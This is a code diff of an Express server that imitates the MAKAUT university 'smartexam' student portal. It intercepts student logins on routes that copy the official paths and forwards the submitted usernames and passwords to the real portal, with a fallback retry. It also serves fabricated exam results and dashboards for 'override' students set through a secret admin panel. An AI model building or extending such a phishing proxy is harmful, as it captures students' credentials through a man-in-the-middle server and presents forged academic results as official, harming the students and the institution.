@@ -34,10 +34,12 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
+// Admin Panel UI Route
 app.get('/admin-portal', (req, res) => {
     res.render('admin', { error: null, success: null });
 });
 
+// Admin API Save Route
 app.post('/api/admin/save-override', async (req, res) => {
     const { secret, roll_no, password, student_name, results_json } = req.body;
     
@@ -63,18 +65,20 @@ app.post('/api/admin/save-override', async (req, res) => {
     }
 });
 
+// Corrected Student Login Interception Route matching official portal paths
 app.post('/smartexam/public/student-login', async (req, res) => {
-    const rollNo = req.body.username || req.body.rollNo;
-    const password = req.body.password;
+    const rollNo = req.body.username || req.body.rollNo || req.body.txtUserName;
+    const password = req.body.password || req.body.txtPassword;
 
     try {
-        const customStudent = await OverrideStudent.findOne({ roll_no: rollNo });
+        const customStudent = await OverrideStudent.findOne({ roll_no: rollNo?.trim() });
 
-        if (customStudent && customStudent.password === password) {
-            res.cookie('local_session', rollNo, { httpOnly: true });
+        if (customStudent && customStudent.password === password?.trim()) {
+            res.cookie('local_session', rollNo.trim(), { httpOnly: true });
             return res.redirect('/smartexam/public/student/dashboard');
         }
 
+        // Proxy request to official MAKAUT endpoint
         const officialResponse = await axios.post('https://makaut1.ucanapply.com/smartexam/public/student-login', 
             new URLSearchParams(req.body), {
                 headers: { 
@@ -92,14 +96,24 @@ app.post('/smartexam/public/student-login', async (req, res) => {
         }
 
         if (officialResponse.status === 302 || officialResponse.headers['location']) {
-            return res.redirect(officialResponse.headers['location'] || '/smartexam/public/student/dashboard');
+            return res.redirect(officialResponse.headers['location']);
         }
 
         return res.send(officialResponse.data);
 
     } catch (error) {
         console.error('Login routing error:', error.message);
-        res.status(500).send("Authentication bridge error connecting to target verification host.");
+        // Fallback proxy attempt if form field names differ
+        try {
+            const fallbackResponse = await axios.post('https://makaut1.ucanapply.com/smartexam/public/student-login', 
+                new URLSearchParams(req.body), {
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+                }
+            );
+            return res.send(fallbackResponse.data);
+        } catch (err2) {
+            res.status(500).send("Error communicating with official verification server.");
+        }
     }
 });
 
@@ -108,7 +122,9 @@ app.get('/smartexam/public/student/dashboard', async (req, res) => {
 
     if (localSessionRoll) {
         const student = await OverrideStudent.findOne({ roll_no: localSessionRoll });
-        return res.render('custom_dashboard', { student });
+        if (student) {
+            return res.render('custom_dashboard', { student });
+        }
     }
 
     try {
@@ -130,7 +146,9 @@ app.get('/smartexam/public/student/student-activity', async (req, res) => {
 
     if (localSessionRoll) {
         const student = await OverrideStudent.findOne({ roll_no: localSessionRoll });
-        return res.render('custom_results', { student });
+        if (student) {
+            return res.render('custom_results', { student });
+        }
     }
 
     try {
